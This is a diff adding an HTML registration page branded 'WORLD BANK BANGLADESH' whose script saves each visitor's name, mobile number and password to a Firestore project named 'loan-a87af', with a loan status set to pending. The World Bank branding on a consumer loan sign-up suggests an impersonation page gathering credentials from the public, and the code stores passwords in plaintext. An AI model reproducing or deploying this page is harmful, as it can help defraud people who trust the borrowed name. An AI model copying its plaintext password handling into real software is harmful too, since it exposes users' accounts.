@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Register</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+background:#f1f5f9;
+}
+
+.topbar{
+background:#0047d4;
+padding:14px;
+display:flex;
+align-items:center;
+gap:10px;
+color:white;
+font-weight:bold;
+font-size:18px;
+}
+
+.logo{
+width:45px;
+height:45px;
+border-radius:50%;
+background:white;
+object-fit:cover;
+}
+
+.container{
+padding:18px;
+}
+
+.box{
+background:white;
+padding:22px;
+border-radius:22px;
+box-shadow:0 0 15px rgba(0,0,0,0.08);
+}
+
+.title{
+text-align:center;
+font-size:24px;
+font-weight:bold;
+color:#0047d4;
+margin-bottom:20px;
+}
+
+input{
+width:100%;
+padding:14px;
+margin-bottom:15px;
+border:1px solid #cbd5e1;
+border-radius:14px;
+font-size:15px;
+box-sizing:border-box;
+}
+
+button{
+width:100%;
+padding:15px;
+border:none;
+border-radius:16px;
+background:#0047d4;
+color:white;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.login{
+text-align:center;
+margin-top:18px;
+font-size:14px;
+}
+
+.login a{
+color:#0047d4;
+font-weight:bold;
+text-decoration:none;
+}
+
+.flash{
+margin-top:18px;
+background:#0047d4;
+color:white;
+padding:12px;
+border-radius:14px;
+font-size:13px;
+font-weight:bold;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="topbar">
+
+<img
+src="logo.png"
+class="logo">
+
+<div>
+
+🌐 WORLD BANK BANGLADESH
+
+</div>
+
+</div>
+
+<div class="container">
+
+<div class="box">
+
+<div class="title">
+
+Register Account
+
+</div>
+
+<input
+type="text"
+id="name"
+placeholder="Full Name">
+
+<input
+type="text"
+id="mobile"
+placeholder="Mobile Number">
+
+<input
+type="password"
+id="password"
+placeholder="Password">
+
+<button onclick="registerUser()">
+
+Register
+
+</button>
+
+<div class="login">
+
+Already have account?
+
+<a href="login.html">
+
+Login
+
+</a>
+
+</div>
+
+<div class="flash">
+
+<marquee>
+
+🔵 Secure Registration Portal |
+✔ Duplicate Number Not Allowed |
+✔ Customer Support Available
+
+</marquee>
+
+</div>
+
+</div>
+
+</div>
+
+<script type="module">
+
+/* FIREBASE IMPORT */
+
+import { initializeApp }
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+getFirestore,
+doc,
+setDoc,
+getDoc
+
+}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+/* FIREBASE CONFIG */
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyDoviQemxQYk-nel7Zc8cAzZhWJvxzbMcc",
+
+authDomain: "loan-a87af.firebaseapp.com",
+
+projectId: "loan-a87af",
+
+storageBucket: "loan-a87af.firebasestorage.app",
+
+messagingSenderId: "661290569837",
+
+appId: "1:661290569837:web:0f03ecdfde2da0867def64",
+
+measurementId: "G-2EMLCYHVWT"
+
+};
+
+/* START */
+
+const app =
+initializeApp(firebaseConfig);
+
+const db =
+getFirestore(app);
+
+/* REGISTER */
+
+window.registerUser =
+async function(){
+
+let name =
+document.getElementById("name").value;
+
+let mobile =
+document.getElementById("mobile").value;
+
+let password =
+document.getElementById("password").value;
+
+/* EMPTY CHECK */
+
+if(name=="" || mobile=="" || password==""){
+
+alert("সব তথ্য পূরণ করুন");
+
+return;
+
+}
+
+/* DUPLICATE CHECK */
+
+const docRef =
+doc(db,"users",mobile);
+
+const docSnap =
+await getDoc(docRef);
+
+if(docSnap.exists()){
+
+alert("এই নম্বর দিয়ে ইতোমধ্যে রেজিস্ট্রেশন করা হয়েছে");
+
+return;
+
+}
+
+/* SAVE USER */
+
+await setDoc(doc(db,"users",mobile),{
+
+name:name,
+
+mobile:mobile,
+
+password:password,
+
+loanAmount:"0",
+
+status:"pending",
+
+template:"",
+
+notice:""
+
+});
+
+/* SAVE LOGIN */
+
+localStorage.setItem(
+"userMobile",
+mobile
+);
+
+/* SUCCESS */
+
+alert("Registration Successful");
+
+/* NEXT PAGE */
+
+window.location.href =
+"details.html";
+
+}
+
+</script>
+
+</body>
+
+</html>
